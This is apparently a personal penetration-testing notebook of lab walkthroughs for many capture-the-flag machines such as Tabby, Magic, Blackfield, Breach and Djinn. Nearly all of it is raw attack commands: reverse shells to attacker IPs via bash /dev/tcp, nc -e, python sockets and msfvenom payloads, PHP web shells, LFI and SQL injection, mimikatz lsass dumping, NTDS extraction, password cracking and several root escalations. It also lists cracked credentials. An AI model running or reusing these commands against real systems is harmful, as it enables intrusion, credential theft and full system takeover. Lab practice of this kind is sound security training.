>enumdomusers
		##got userlist
>enumprinters
		##got credz  $fab@s3Rv1ce$1
msfconsole
>use auxiliary/scanner/winrm/winrm_login
>set rhost 10.10.10.180
>set user_file user.txt
>set password $fab@s3Rv1ce$1
>exploit
		##got credz svc-print:$fab@s3Rv1ce$1
evil-winrm -i fuse.htb -u svc-print -p '$fab@s3Rv1ce$1'
>whoami /all
		##got privesc SeLoadDriverPrivilege         Load and unload device drivers Enabled
		##souce: https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
		##not complete yet because cant compile .cpp file
		






Tabby HTB
================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.194 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.194 -o nmap
http://10.10.10.194:8080
http://10.10.10.194
http://megahosting.htb/news.php?file=statement
http://megahosting.htb/news.php?file=../../../etc/passwd
		##got userlist, and there is tomcat user
http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
		##got credz tomcat:$3cureP4s5w0rd123!
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4343 -f war > exp.war
curl -v -u 'tomcat:$3cureP4s5w0rd123!' -T exp.war 'http://10.10.10.194:8080/manager/text/deploy?path=/exp&update=true'
nc -lvp 4343
http://10.10.10.194:8888/exp
>id
>ls files
wget http://10.10.10.194/files/16162020_backup.zip
fcrackzip -D -p /home/rockyou.txt 16162020_backup.zip
		##got password admin@it
>ls /home
>su ash
>which python3
>python3 -c 'import pty;pty.spawn("/bin/bash")'
>cd ~
>cat user.txt
>id
		##LXD LXC privesc 
>wget http://10.10.14.4:8888/alpine.tar.gz
>lxc image list
>lxc image import alphine.tar.gz --alias imageku
>lxc init imageku ignite -c security.privileged=true
		##got error & need to init lxd
>lxd init
		##yes to all
>lxc init imageku ignite -c security.privileged=true
>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
>lxc start ignite
>lxc exec ignite /bin/sh
>id
>cd /mnt/root/root
>ls
>cat root.txt




Magic HTB
====================================
pport=$(nmap -Pn -p- --min-rate=10000 -T4 10.10.10.185 | grep ^[0-9] | cut -d "/" -f1 | tr "\n" "," | sed s/,$//); nmap -sC -sV -A -p $pport 10.10.10.185 -o nmap
dirb http://10.10.10.185 -X .php
http://10.10.10.185/login.php
		##login with sql 'or 1=1-- -
http://10.10.10.185/upload.php
		##or without logit but intercept response upload.php from 302 Found to 2-- OK
		##change config on burp to replace 302 Found to 200 OK
		##upload shell 5hell.php.jpg
		##<php echo shell_exec($_GET['c']);?>
http://10.10.10.185/image/uploads/5hell.php?c=whoami
http://10.10.10.185/image/uploads/5hell.php?c=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.86/4343 0>&1'
nc -lvp 4343
>whoami
>cat db.php5
>mysqldump Magic -utheseus -piamkingtheseus
		##got credz admin:Th3s3usW4sK1ng
>su theseus
>cd .ssh
ssh-keygen
cat id_rsa.pub | xclip -selection primary
>vi authorized_keys
ssh theseus@10.10.10.185
>find / -user root -type f -perm -4000  -ls 2>/dev/null | grep -v snap
>/bin/sysinfo
>strings /bin/sysinfo
>cd /tmp
>touch lshw
		#!/bin/bash
		echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd
>chmod 777 lshw
>echo $PATH
>export PATH=/tmp:$PATH
>/bin/sysinfo
>su rooot




Buff HTB
====================================
git clone https://github.com/Tib3rius/AutoRecon
curl https://bootstrap.pypa.io/get-pip.py | sudo python
pip install --upgrade setuptools
python3 -m pip install requirements.txt
python3 aurecon.py 10.10.10.198
python autorecon.py 10.10.10.198
		##download exploit gym management software
		##https://www.exploit-db.com/exploits/48506
python exp.py http://10.10.10.198:8080/
>cp /usr/share/windows-binaries/nc.exe .
>cp /usr/share/windows-binaries/plink.exe .
>dir
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc 10.10.14.45 4141 -e cmd.exe
nc -lvp 4343
>whoami
>cd c:\users\shaun\download\
>dir
		##exploit cloudme 1.11
		##https://www.exploit-db.com/exploits/48389
>plink.exe -l root -pw eleven 10.10.14.45 -R 8888:127.0.0.1:8888
msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.45 4242′ -b ‘\x00\x0a\x0d’ -f py -v payload
		##copy to exploit
nc -lvp 4242
python buff-exp.py





Blackfield HTB
====================================
python3 autorecon.py 10.10.10.192
smbclient -L 10.10.10.192
smbclient \\\\10.10.10.192\\profiles$
>dir
		##safe directory profiles to user list
cp /usr/share/doc/python3-impacket/example/GetNPusers.py .
ldapsearch -h 10.10.10.192 -x -s base namingcontexts
		##got active domain BLACKFIELD,LOCAL
python3 BLACKFIELD.LOCAL/ -usersfile users.txt -format john -outputfile hashes.txt -dc-ip 10.10.10.192
		##got kerberos hash user support
hashcat -m 18200 -a 0 -w 3 kerb.txt /home/rockyou.txt -o crack-kerb.txt --force
rpcclient 10.10.10.192 -U support
>enumdomusers
>enumdomgroups
>querydominfo
>queryuser 0x1f4
		##query detail domain admin activity
>setuserinfo2 audit2020 testing123@
>quit
smbclient \\\\10.10.10.192\\forensic -U audit2020
smb://10.10.10.192/forensic
>download lsass.zip
unzip lssass.zip
		##open with mimikatz windows
>sekurlsa::minidum lsass.DMP
>sekurlsa::logonpasswords
		##got credz user hash srv_backup
evil-winrm -i 10.10.10.192 -u srv_backup -H 9658d1d1dcd9250115e2205d9f48400d
>whoami /all
		##privsec SeBackupPrivilege https://github.com/giuliano108/SeBackupPrivilege
cat dskshdw.txt
		set context persistent nowriters
		add volume c: alias lol
		create
		expose %lol% x:	
>mkdir c:\tmp
>upload SeBackupPrivilegeUtils.dll
>upload SeBackupPrivilegeCmdLets.dll
>upload dskshdw.txt
>diskshadow /s dskshdw.txt
>Import-Module .\SeBackupPrivilegeUtils.dll
>Import-Module .\SeBackupPrivilegeCmdLets.dll
>Set-SeBackupPrivilege
>Copy-FileSeBackupPrivilege x:\Windows\NTDS\ntds.dit C:\tmp\ntds.dit
>reg save HKLM\SYSTEM c:\tmp\system
>download system
>download ntds.dit
cp /usr/share/doc/python3-impacket/example/secretdump.py .
python3 secretdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output crck-ntds.txt
evil-winrm -i 10.10.10.192 -u Administrator -H 184fbmf09u88orijh788gg189ee
>whoami
>type ../Desktop/root.txt




Blue THM
====================================
nmap -Pn -p- --min-rate=10000 -T4 10.10.167.228
nmap -p 445 --script smb-vuln-ms17-010 10.10.167.228
msfconsole
>use exploit/windows/smb/ms17_010_eternalblue
>set rhost 10.10.167.228
>run
>whoami
>cd c:/users/
>dir /s *.txt





GoldenEye
===================================
python3 autorecon.py 10.1.1.56
http://10.1.1.56/
http://10.1.1.56/terminal.js
		##got credz boris with passwd encoded with html
http://10.1.1.56/sev-home/
cp /usr.share/wordlist/fasttrack.txt .
hydra -l boris -P fasttrack.txt -f 10.1.1.56 -s 55007 pop3
		##got credz boris:secret1!
telnet 10.1.1.56 55007
>user boris
>pass secret1!
>list
>retr 1
hydra -l natalya -P fasttrack.txt -f 10.1.1.56 -s 55007 pop3
		##got credz natalya:bird
>user natalya
>pass bird
>list
>retr 2
		##got credz xenia:RPC90rulez!
nano /etc/hosts
		##10.1.1.56	servernaya-station.com
http://severnaya-station.com/gnocertdir
		##login and show message from Doak
hydra -l doak -P fasttrack.txt -f 10.1.1.56 -s 55007 pop3
		##got credz doak:goat
>user doak
>pass goat
>list
>retr 1
		##got credz doak:4England!
http://severnaya-station.com/gnocertdir/login
http://severnaya-station.com/gnocertdir/user/files.php
wget http://severnaya-station.com/dir007key/for-007.jpg
file for-007.jpg
exiftool for-007.jpg
		##got credz admin:xWinter1995x!
http://severnaya-station.com/gnocertdir/login
http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths
		##RCE moodle on spell check mode
		##add python reverse shell
		##python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.56",4141));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
		##edit Text editor –>tinyMCEHTML –>settings -> googlespell ->pshellspell
nc -lvp 4141
		##request spellcheck and got shell
>python -c 'import pty;pty.spawn("/bin/bash")'
>^Z
stty raw -echo
fg
reset
>uname-a
>cat /etc/lsb-release
searchsploit ubuntu 14.02
>which gcc
>locate gcc
>which cc
wget https://www.exploit-db.com/download/37292.c
searchsploit -m 37292.c
		##edit gcc to cc
>cc exp.c -o exp
>./exp
>cat /root/.flag.txt







Weakness a.k.a w34kn3ss
===================================
autorecon 10.1.1.57
dirb http://10.1.1.57
dirb https://10.1.1.57
cat result/10.1.1.57/scans/tcp_445_sslscan.txt
nano /etc/hosts
		##10.1.1.57		weakness.jth
http://weakness.jth
dirb http://weakness.jth
http://weakness.jth/private/files/note.txt
		##generated by openssl 0.9.8c-1
wget http://weakness.jth/private/files/mykey.pub
searchsploit openssl 0.9
searchsploit -m 5720
cat 5720.py
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 
tar -xfv debian_ssh_rsa_2048_x86.tar.bz2
cd rsa/2048
grep -l -r `cat mykey.pub`
		##got exact file 4161de56829de2fe64b9055711f531c1-2537.pub
ssh n30@10.1.1.57 -i 4161de56829de2fe64b9055711f531c1-2537
>which nc
nc -lvp 4141 > code
>nc 10.1.1.5 4141 < code
>python code
file code
mv code code.pyc
pip install uncompyle6
uncompyle6 code
		##got credz n30:dMASDNB!!#B!#!#33
>sudo -l
>sudo su





Toppo
===================================
autorecon 10.1.1.58
http://10.1.1.58/admin/notes.txt
		##got pass 12345ted123
ssh ted@10.1.1.58
>which sudo
nc -lvp 4141 < liepas.sh
>nc 10.1.1.5 4141 > linpeas.sh
>./linpeas.sh
		##awk/mawk privsc
awk 'BEGIN {system("/bin/sh")}'
awk '//' "/etc/shadow"
		##python2.7 privsc
python -c 'import pty;pty.spawn("/bin/sh")'






Bob 1
==========================================
python3 autorecon.py 10.1.1.59
http://10.1.1.59/robots.txt
view-source:http://10.1.1.59/news.html
		##got hint passwords.html
http://10.1.1.59/passwords.html
		##got credz jc:Qwerty seb:Titanium_Pa$$word_H4cker
http://10.1.1.59/dev_shell.php
		##which ping
		##/bin/ping 10.1.5
tcpdump -in eth0 icmp
http://10.1.1.59/dev_shell.php
		##which nc
		##/bin/nc -e /bin/bash 10.1.1.5 4141 		
nc -lvp 4141
ssh jc@10.1.1.59 -p 25468
>cat /home/elliot/theadminisdumb.txt
		##got credz elliot:theadminisdumb
>su elliot
>sudo -l
>cd /home/bob/Document/
>file login.txt.gpg
>gpg -d login.txt.gpg
>gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
		##use pass from file inside dir bob HARPOCRATES
		##got credz bob:b0bcat_
>su bob
>sudo -l
>sudo su







Breach 1
=====================================
python3 autorecon.py 192.168.110.140
dirb http://breach1
view-source:http://breach1
		##2x base64 decurypt and got credz pgibbons:damnitfeel$goodtobeagang$ta
dump http://breach/images/
exiftool bill.jpg
http://breach/initech.html
http://breach/impresscms/
		##login with pgibbons
		##read message and content
wget http://breach/.keystroke
wget http://breach/impresscms/_SSL_test_phase1.pcap
		#download both content and password keystrke=tomcat
mv .keystroke keystroke
file keystroke
		##decrypt SSL with wireshark and java key
		##conver keystroke to pk12
keytool -list -v -keystore keystore
keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore key_test.p12 -deststoretype PKCS12
keytool -importkeystore -srckeystore keystore -destkeystore key_test.p12 -srcstoretype JKS -deststoretype PKCS12 -srcstorepass tomcat -deststorepass tomcat -srcalias tomcat -srckeypass tomcat -destkeypass tomcat -noprompt 
openssl pkcs12 -in key_test.p12 -nocerts -nodes
wireshark &
		##decrypt wireshark pcap
		##open pcapfile _SSL_test_phase1.pcap
		##Select Edit -> Preferences -> Protocols -> TLS -> edit RSA Keys list
		##ip=192.168.110.140, port=80, key file=key_test.p12 password=tomcat
		##open TLSv1 log -> follow TLS Stream
		##got Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
		##encoded and got tomcat:Tt\5D8F(#!\*u=G)4m7zB
https://breach:8443
		##tomcat war file exploit
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.101 LPORT=4141 -f war > shell.war
nc -lvp 4141
https://breach:8443/shell
>python -c 'import pty;pty.spawn("/bin/bash")'
>mysql impresscms -u root
>>show databases;
>>use mysql;
>>select User,Password from user;
		##got credz milton md5 hash
		##cracked in crackstation.net milton:thelaststraw
>su milton
>sudo -l
exiftool images/bill.jpg
		##comment: coffeestrains
>su blumbergh
>sudo -l
		##tee privsc
>echo 'cat exp.txt' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
>su rooot
		##got another privsc but need reboot
		##/etc/init.d writable
>nano /etc/init.d/portly.sh
#reboot
nc -lvp 4141





Breach 2
===================================
python3 autorecon.py 192.168.110.151
ssh 192.168.110.151 -p 65535
		##got hint the passwd is in the source and the passswd actually is inthesource
		##create wordlist every word
https://design215/toolbox/wordlist.php
ssh peter@192.168.110.151 -p 65535
		##nmap again an port 8888 is now open
dirb http://192.168.110.151/
dirb http://192.168.110.151/blog/ -X .php,.html,.txt,.db
http://192.168.110.151/blog/index.html?search='
sqlmap -u http://192.168.110.151/blog/index.html?search=1 --dbs
sqlmap -u http://192.168.110.151/blog/index.html?search=1 --dbs -D oscommerce --tables
sqlmap -u http://192.168.110.151/blog/index.html?search=1 --dbs -D oscommerce -T osc_administrators --dump
		##got admin:32admin cracked in hashkiller
http://192.168.110.151/blog/register.html
		##old BlogPHP cms exploited with Stored XXS
		##https://www.exploit-db.com/exploits/17640
apt-get install beef-xss
beef-xxs
		##register with this user
		##<META http-equiv="refresh" content="0;URL=http://192.168.110.101:3000/demos/butcher/index.html">
http://192.168.110.151/blog/member.html
		##got stored XXS and the server using old Firefox 15/0
		##https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest
msfconsole
>use exploit/multi/browser/firefox-proto_crmfrequest
>show payloads
>set paypload generic/shell_reverse_tcp
>set srvhost 192.168.110.101
>set srvport 8888
>set uripath shell
>set lhost 192.168.110.101
>exploit
		##open beef 192.168.110.151 -> commands -> misc -> iFrame event logger > http://192.168.110.101:8888/shell
		##execute
>sessions -i
>use post/multi/manage/shell_to_meterpreter
>set session 1
>exploit
		##got another sessions with meterpreter
>sessions -i 2
>sysinfo
>shell
>netstat -plnta
>telnet 127.0.0.1 2323
		##got coordinate and lookup it then got Houston City
>user:hamilton
>pass:Houston
>find /usr –user milton
>cat /usr/local/bin/cd.py
>mine
		##got shell as user milton
>netstat -tln
http://192.168.110.151:8888/oscommerce/
http://192.168.110.151:8888/oscommerce/admin
		##login with admin:admin32
		##upload shell
nc -lvp 4141
>echo "import pty;pty.spawn('/bin/bash')" > /tmp/asd.py
>python /tmp/ads.py
>whoami
>sudo -l
		##tcpdump privsc
>echo $'id\n/bin/netcat 192.168.110.101 4321 –e /bin/bash' > /tmp/exp.sh
>chmod +x exp.sh
>sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/exp.sh -Z root
nc -lvp 4321
>id
>python .flag.py





Breach 3
===================================
python3 autorecon.py 10.1.1.60
snmpwalk -v 2c -c public 10.1.1.60
		##got STRING: "Email: Milton@breach.local - (545)-232-1876
knock -v 10.1.1.60 545 232 1876
nmap -Pn -p- --min-rate=10000 -T4 10.1.1.60
		##got new open port TCP
ssh 10.1.1.60
		##got banner "call at 555-432-1800"
knock -v 10.1.1.60 555-432-1800
nmap -Pn -p- --min-rate=10000 -T4 10.1.1.60
http://10.1.1.60:8
		##use credz from breach2 milton:thelaststraw
dirb http://10.1.1.60:8/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw=="
dirb http://10.1.1.60:8/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw==" -X .php,.html,.txt,.log,.db
dirb http://10.1.1.60:8/breach3/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw=="
		##SQLI login form
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080 --tamper=equaltolike
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080 --tamper=equaltolike -D thebobs --dump
		##got credz admin:8f89jdj9081u3ijandvpa229
		##cracked on hashkiller.io admin:randomhash
		##sadly cant use it on login
sqlmap -r req.txt --dbs --batch --level=5 --risk=3 --dbms=mysql --proxy=http://127.0.0.1:8080 --tamper=equaltolike -D backup --dump
		##got credz blumbergh:c0ff335train
		##login sqli
username=admin&password=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL--+asd&submit=+Login+' UNION ALL SELECT NULL,NULL,NULL-- asd
dirb http://10.1.1.60:8/breach3/thebobscloudhostingllc/ -H ""Authorization: basic bWlsksfojijf09ujqjkdw==" -X .php
		##got php page livechat.php
		##rce seacher parameter
http://10.1.1.60:8/breach3/thebobscloudhostingllc/livechat.php?searcher=ls
cat /root/.ssh/id_rsa.pub
http://10.1.1.60:8/breach3/thebobscloudhostingllc/livechat.php?searcher=sudo -l
		##im stuck cant get in






Lemonsqueezy
===================================
python3 autorecon.py 10.1.1.61
http://10.1.1.61
http://lemonsqueezy/wordpress/
wpscan --url http://lemonsqueezy/wordpress/ -e u,vp,vt
wpscan --url http://lemonsqueezy/wordpress/ -U user.txt -P /home/rockyou.txt
		##got credz orange:ginger
http://lemonsqueezy/wodpress/wp-admin/edit.php
		##got n01n@w0rdl1st
http://lemonsqueezy/phpmyadmin
		##use orange:n01n@w0rdl1st
		##change lemon user to godmode hash
		##vulnerable plugins themes
		##WpStore, store, eShop, KidzStore, emporium, framework, eCommerce
		##http://lastc0de.blogspot.com/2013/07/exploit-wordpress-themes-upload.html
http://lemonsqueezy/phpmyadmin/server_sql.php
		##phpmyadmin shell
		##query: select "<?php system($_GET['c']);?>" into outfile "/var/www/html/wordpress/shell.php"
http://lemonsqueezy/wordpress/shell.php?c=id
http://lemonsqueezy/wordpress/shell.php?c=/bin/nc -e /bin/bash 10.1.1.5 4141
nc -lvp 4141
>python -c 'import pty;pty.spawn("/bin/bash")'
>cd /home
>find .
>wget http://10.1.1.5:8888/linpeas.sh
>bash linpeas.sh
>ls -lah /etc/logrotate.d/logrotate
>vi /etc/logrotate.d/logrotate
		##add python reverse shell
		##import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.5",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
nc -lvp 4242
>whoami
>cat /root/flag








Sar
==================================
python3 autorecon.py 10.1.1.62
http://10.1.1.62/robots.txt
http://10.1.1.62/sar2HTML/
		##exploit sar2HTML 3.2.1 RCE
		##https://www.exploit-db.com/exploits/47204
http://10.1.1.62/sar2HTML/index.php?plot=;id
http://10.1.1.62/sar2HTML/index.php?plot=;wget 10.1.1.5:8888/shell.php
		##upload backdoor php
http://10.1.1.62/shell.php
>/usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.1.1.5:4242		
socat file:`tty`,raw,echo=0 TCP-L:4242
>id
>wget http://10.1.1.5:8888/linpeas.sh
>bash linpeas.sh
		##crontab exploit
>ls -lah /var/spool/cron/crontab
		##root crontab editable
>cat /etc/crontab
>ls -lah /var/www/html
		##file finnaly.sh owned by root execute write.sh
>vi /var/spool/cron/crontab/root
		##2 * * * * /var/www/html/finally.sh
>vi /var/www/html/write.sh
		##bash -c "bash -i >& /dev/tcp/10.1.1.5/4444 0>&1"
>chmod 755 write.sh
nc -lvp 4444
>id
>cat ~/root.txt







EVM
===================================
python3 autorecon.py 10.1.1.64
dirb http://10.1.1.64
http://10.1.1.64/wordpress/
		##wordpress is error template ip address
		##change response in burp to original ip address
wpscan --url http://10.1.1.64/wordpress/ -e u,vp,vt
wpscan --url http://10.1.1.64/wordpress/ -e vp --plugins-detection aggressive --proxy http://127.0.0.1:8080
wpscan --url http://10.1.1.64/wordpress/ -e vp wp-content-dir /wp-content/ --plugins-detection aggressive --proxy http://127.0.0.1:8080
wpscan --url http://10.1.1.64/wordpress/ -U user.txt -P /home/rockyou.txt
		##got credz c0rrupt3d_brain:484848
http://10.1.1.64/wordpress/wp-login.php
		##got plugin WordPress Plugin WP Vault 0.8.6.6 - LFI 
		##https://www.exploit-db.com/exploits/40850
http://10.1.1.64/wordpress/?wpv-image=../../../../../../../../../../etc/passwd
		##cant exit template 404.php
		##install file manager plugin and upload shell
http://10.1.1.64/wordpress/shell.php
		##pyhon reverse shell
>export RHOST="10.1.1.5";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>cd /home/root3er
>ls -lah
>cat .root_password_ssh.txt
		##got root passwd willy26
>su root
>cat ~/proof.txt





TommyBoy
===================================
python3 autorecon.py 10.1.1.63
view-source:http://10.1.1.63/
http://10.1.1.63/robots.txt
http://10.1.1.63/flag-numero-uno.txt
		##flag1: B34rcl4ws
http://10.1.1.63/prehistoricforest/
http://10.1.1.63/prehistoricforest/thisisthesecondflagyayyou.txt
		##flag2: Z4l1nsky 
wpscan --url http://10.1.1.63/prehistoricforest/ -e u,vp,vt
http://10.1.1.63/richard/
wget http://10.1.1.63/richard/shockedrichard.jpg
exiftool shockedrichard.jpg
		##got hash decoded as spanky
		##open protected content with this passwd
http://10.1.1.63/prehistoricforest/index.php/2016/7/06/status-of-restoring-company-home-page/
		##port ftp 65534 open every 15 minutes with user nickburns:nickburns
nmap --Pn -p- --min-rate=10000 10.1.1.63
ftp 10.1.1.63 65534
>dir
>get readme.txt
cat readme.txt
		##there directory NickIzl33t
http://10.1.1.63:8008/NickIzl33t/
		##change User-Agent to iphone in burp
http://10.1.1.63:8008/NickIzl33t/
dirb http://10.1.1.63:8008/NickIzl33t/ /home/rockyou.txt -a "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" -X .html
		##dirb is ded, use gobuster
		##got fallon1.html
http://10.1.1.63:8008/NickIzl33t/fallon1.html
http://10.1.1.63:8008/NickIzl33t/flagtres.txt
		##flag3: TinyHead
wget http://10.1.1.63:8008/NickIzl33t/t0msp4ssw0rdz.zip
http://10.1.1.63:8008/NickIzl33t/hint.txt
crunch 13 13 -t bev,%%@@^1955 -o wordlist_tommy.txt
fcrackzip -D -u -p wordlist_tommy.txt t0msp4ssw0rdz.zip
		##got passwd bevHOOtr$1995
unzip t0msp4ssw0rdz.zip
cat passwords.txt
wpscan --url http://10.1.1.63/prehistoricforest/ -U user.txt -P /home/rockyou.txt
		##got hit tom:tomtom1
http://10.1.1.63/prehistoricforest/wp-admin/post.php?post=22&action=edit
		##combined credz with passwords.txt and get bigtommysenior:fatguyinalittlecoat1938!!
ssh bigtommysenior@10.1.1.63
>cat el-flag-numero-quatro.txt
		##flag4: EditButton
>cp /callalahan.bak /var/www/html/index.html
>ls -lah /
		##flag5 owned by www-data
		##find writeble directory as tommy to www-data
>find / -perm -2 -type d 2>/dev/null
>cd /var/thatsg0nnaleavemark/NickIzL33t/P4TCH_4D4MS/uploads/
nc -lvp 4141 < p0wny.php
>nc 10.1.1.5 4141 > shell.php
http://10.1.1.5:8008/NickIzL33t/P4TCH_4D4MS/uploads/shell.php
>cat /.5.txt
		##flag5: Buttcrack
>unzip /home/bigtommysenior/LOOT.zip
		##with passwd all flag
		##B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
>cat THE-END.txt		
		






RickdiculouslyEasy 
===================================
python3 autorecon.py 10.1.1.65
ftp 10.1.1.65
>anonymous
>ls
>get FLAG.txt
cat FLAG.txt
		##flag1
http://10.1.1.65/robots.txt
http://10.1.1.65/passwords/FLAG.txt
		##flag2
view-source:http://10.1.1.65/passwords/password.html
		##got password winter
http://10.1.1.65/cgi-bin/tracertool.cgi?ip=10.1.1.5;id
http://10.1.1.65/cgi-bin/tracertool.cgi?ip=10.1.1.5;head /etc/passwd
hydra -L user.txt -p winter ssh://10.1.1.65:22222
		##got credz Summer:winter
ssh Summer@10.1.1.65 -p 22222
>find / -writable 2>/dev/null
>ls -lah /home/Morty
>nc 10.1.1.5 4141 < Safe_Password.jpg
>nc 10.1.1.5 4141 < journal.txt.zip
nc -lvp 4141 > safe_password.jpg
strings safe_password.jpg
		##got passwd zip Meeseek
file journal.txt.zip
unzip journal.txt.zip
>cp /home/RickSanchez/safe ~/
>./safe 131333
crunch 7 7 -t ,%Fleash -o rickpasswd.txt
crunch 10 10 -t ,%Curtains -o rickpasswd.txt
hydra -l RickSanchez -P rickpasswd.txt ssh://10.1.1.65:22222
		##got credz RickSanchez:P7Curtains
ssh RichSanchez@10.1.1.65 -p 22222
>sudo -l
>sudo su
>head -n 100 /root/FLAG.txt








Djinn
================================
python3 autorecon.py 10.1.1.66
ftp 10.1.1.66
>anonymous
>get creds.txt
>get game.txt
>get message.txt
telnet 10.1.1.66 1337
		##game with math question and solved with python pwntools
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
nano py-game.py
	#!/usr/bin/env python3
	from pwn import *
	c = remote('192.168.14.106',1337)
	c.recvuntil("\n\n", drop=True)
	# Loop 1000 times
	for i in range(1001):
		# read from ( to ,
		c.recvuntil("(", drop=True)
		int1 = c.recvuntil(",", drop=True)
		# read from ' to ,
		c.recvuntil("'", drop=True)
		mathsym = c.recvuntil("'", drop=True)
		# read from , to )
		c.recvuntil(", ", drop=True)
		int2 = c.recvuntil(")", drop=True)
		# calculate equation
		equation = int1+mathsym+int2
		print(str(i)+"th answer= "+str(equation))
		# send answer
		c.sendlineafter('>',equation)
	c.interactive()
python3 py-game.py
		##got 1356, 6784, 3409 which is port to knock
knock 10.1.1.66 1356 6784 3409
nmap -Pn -p- --min-rate=10000 10.1.1.66
http://10.1.1.66:7331
gobuster dir -u http://10.1.1.66:7331 -w /usr/share/wordlists/dirb/big.txt
http://10.1.1.66:7331/wish
		##filtered website rce
		##if pipe (|) enable then bypass with base64
http://10.1.1.66:7331/wish
		##cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0LjEwNy84MDgwIDA+JjEK | base64 -d | bash
nc -lvp 4141
>python -c 'import pty;pty.spawn("/bin/bash")'
>cat app.py | grep nitish
		##got CREDS = "/home/nitish/.dev/creds.txt"
>cd /home/nitish/
>cat .dev/creds.txt
		##got credz nitish:p4ssw0rdStr3r0n9
>su nitish
>sudo -l
		##genie privsc
>which genie
>genie -h
>genie -e id asd
>sudo -u sam genie -e id asd
>man genie
>sudo -u sam genie cmd asd
>bash
>whoami
>sudo -l
		##lago privsc
>sudo /root/lago
>cd .
>grep -ir naughtys .* 2>/dev/null
>grep -ir naughtys /home/* 2>/dev/null
>file /home/sam/.pyc
>nc 10.1.1.5 4444 < .pyc
nc -lvp 4444 > samgame.pyc
file samgame.pyc
uncompyle6 samgame.pyc
		##got shell if input num
>sudo /root/lago
>>2
>>num
>id
>bash
>whoami
>ls /root/
>bash proof.sh







Bravery
================================
python3 autorecon.py 10.1.1.67
http://10.1.1.67/robots.txt
showmount -e 10.1.1.67
mount -t nfs -o nfsvers=3 10.1.1.50:/home/nfs mnt/
cd mnt/
cat discovery
cat enumeration
cat explore
cat password.txt
cat qwertyuioplkjhgfdsazxcvbnm
		##unmount
df -k
umount /home/bravery/mnt
smbmap -H 10.1.1.67
smbclient \\\\10.10.10.192\\anonymous -U ""
		##smbdump
>mask ""
>recurse ON
>prompt OFF
>mget *
>exit
		##find words
find -ir pass *
ls -Rlah
ls -Rlah | grep -v "0 Sep"
smbclient \\\\10.10.10.192\\secured -U "David"
password: qwertyuioplkjhgfdsazxcvbnm
get david.txt
get genevieve.txt
get README.txt
http://10.1.1.67/geneieve/cuppaCMS/
searchsploit cuppa cms
searchsploit -m 25971
cat 25971.txt
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd
		##LFI base64 php cuppa CMS
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
echo "LFI" | base64 -d
cat shell.php
		<?php system($_REQUEST['cmd']);?>
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.1.1.5/shell.php&cmd=id
http://10.1.1.67/geneieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.1.1.5/shell.php&cmd=wget 10.1.1.5/p0wnie.php
http://10.1.1.67/geneieve/cuppaCMS/alerts/p0wnie.php
>0<&196;exec 196<>/dev/tcp/10.1.1.5/4242; sh <&196 >&196 2>&196
nc -lvp 4242
>wget 10.1.1.5/linpeas.sh
>bash linpeas.sh > linpeas.txt
>mysql -u "root" localhost -p
>>show databases;
>>use bravery;
		##describe table
>>describe cp_users;
>>select * from cp_users;
>>exit
>cat linpeas.txt
		##cp privsc
>cp /etc/shadow /dev/stdout
